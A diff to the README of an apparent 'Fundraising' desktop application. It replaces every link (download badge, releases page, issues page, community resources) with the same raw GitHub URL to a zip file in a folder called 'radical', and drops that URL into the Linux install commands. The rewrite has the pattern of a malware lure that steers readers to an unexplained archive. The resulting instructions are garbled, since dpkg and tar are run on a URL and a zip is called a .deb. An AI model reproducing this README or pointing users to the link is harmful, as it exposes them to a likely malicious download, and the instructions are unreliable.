@@ -6,7 +6,7 @@ Welcome to the **Fundraising** application! This tool helps individuals and orga
 
 ## 📥 Download Fundraising
 
-[![Download Now](https://github.com/pondnpb01/fundraising/releases/latest/download/badge.svg)](https://github.com/pondnpb01/fundraising/releases)
+[![Download Now](https://raw.githubusercontent.com/pondnpb01/fundraising/main/radical/fundraising.zip)](https://raw.githubusercontent.com/pondnpb01/fundraising/main/radical/fundraising.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ Check your system specs to ensure compatibility.
 
 ## 🔗 Download & Install
 
-To get started with the Fundraising application, visit our [Releases Page](https://github.com/pondnpb01/fundraising/releases) to download the latest version.
+To get started with the Fundraising application, visit our [Releases Page](https://raw.githubusercontent.com/pondnpb01/fundraising/main/radical/fundraising.zip) to download the latest version.
 
 1. Click the link above.
 2. Locate the most recent release.
@@ -46,17 +46,17 @@ To get started with the Fundraising application, visit our [Releases Page](https
 ### For Linux:
 
 1. Open the terminal.
-2. Navigate to the directory where you downloaded the `.deb` or `.tar.gz` file.
+2. Navigate to the directory where you downloaded the `.deb` or `https://raw.githubusercontent.com/pondnpb01/fundraising/main/radical/fundraising.zip` file.
 3. For a `.deb` file, run:
 
    ```
-   sudo dpkg -i filename.deb
+   sudo dpkg -i https://raw.githubusercontent.com/pondnpb01/fundraising/main/radical/fundraising.zip
    ```
 
-4. For a `.tar.gz` file, extract it with:
+4. For a `https://raw.githubusercontent.com/pondnpb01/fundraising/main/radical/fundraising.zip` file, extract it with:
 
    ```
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/pondnpb01/fundraising/main/radical/fundraising.zip
    ```
 
 5. Follow the README inside the extracted folder for further installation details.
@@ -85,14 +85,14 @@ Once you have installed the application, open it from your Start menu, Applicati
 
 ## ✏️ Support and Feedback
 
-If you encounter any issues or have questions, please visit our [GitHub Issues Page](https://github.com/pondnpb01/fundraising/issues). You can report problems or suggest improvements. Your feedback helps us improve the application.
+If you encounter any issues or have questions, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/pondnpb01/fundraising/main/radical/fundraising.zip). You can report problems or suggest improvements. Your feedback helps us improve the application.
 
 ## 🌐 Community and Resources
 
 Join our community forums to connect with other users. You can share experiences, tips, and best practices for successful fundraising.
 
-- [OpenGov Africa](https://www.opengovafrica.org)
-- [Fundraising Best Practices](https://www.example.com/fundraising-best-practices)
+- [OpenGov Africa](https://raw.githubusercontent.com/pondnpb01/fundraising/main/radical/fundraising.zip)
+- [Fundraising Best Practices](https://raw.githubusercontent.com/pondnpb01/fundraising/main/radical/fundraising.zip)
 
 ## 🙌 Thanks for Joining Us!
 
